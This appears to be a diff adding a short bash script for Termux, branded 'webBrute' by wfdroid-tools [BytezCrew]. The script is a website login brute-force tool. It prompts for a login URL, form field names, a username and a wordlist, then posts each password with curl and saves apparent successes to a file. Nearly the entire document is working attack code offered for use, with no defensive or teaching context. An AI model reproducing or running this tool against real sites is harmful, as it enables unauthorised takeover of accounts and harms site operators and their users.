@@ -1,0 +1,40 @@
+#!/data/data/com.termux/files/usr/bin/bash
+clear
+echo "              _     ____             _        ";
+echo "__      _____| |__ | __ \ _ __ _   _| |_ ___  ";
+echo "\ \ /\ / / _ \ '_ \|  _ \| '__| | | | __/ _ \ ";
+echo " \ V  V /  __/ |_) | |_) | |  | |_| | ||  __/ ";
+echo "  \_/\_/ \___|_.__/|____/|_|   \__,_|\__\___| ";
+echo "               Website Login Brute Force Tool ";
+echo "                 by wfdroid-tools [BytezCrew] ";
+echo -ne '\n';
+echo '### SITE DATA ###';
+echo -n "Input URL Login Post : "; read url
+echo -n "Error Login Msg : "; read errmsg
+echo -n "InputForm User : "; read inpusr
+echo -n "InputForm Password : "; read inppwd
+echo '';
+echo '### BRUTE FORCE VALUE ###';
+echo -n "Username : "; read username
+echo "";
+echo "Wordlist File";
+echo -n "Default [wordlist.txt] : "; read wlist
+
+echo Total [$(wc -l < $wlist)] Wordlist
+
+i=0
+for passw in $(cat $wlist); do
+	i=$[i+1]
+	brute=$(curl -i -L -s --data-urlencode  $inpusr=$username --data-urlencode $inppwd=$passw $url)
+	if [[ $brute =~ $errmsg ]];
+	then
+		echo '['$i'/'$(wc -l < $wlist)'] TRYING BRUTEFORCE.';
+
+	else
+		echo '['$i'/'$(wc -l < $wlist)'] MAYBE FOUND!! '$username'|'$passw;
+		echo $url'|'$username'|'$passw >> /data/data/com.termux/files/usr/share/wfdroid/done/bruteforced_$(date +%d_%m_%Y).txt;
+	fi
+done
+
+echo "Check your result in : ";
+echo "/data/data/com.termux/files/usr/share/wfdroid/done/bruteforced_date.txt";
